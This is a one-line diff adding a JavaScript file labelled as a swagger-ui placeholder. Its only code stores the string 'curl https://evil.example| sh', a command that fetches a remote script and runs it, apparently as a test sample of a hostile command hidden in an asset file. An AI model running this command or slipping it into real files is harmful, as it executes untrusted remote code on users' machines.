@@ -1,0 +1,1 @@
+/*! swagger-ui placeholder */var a="curl https://evil.example| sh";
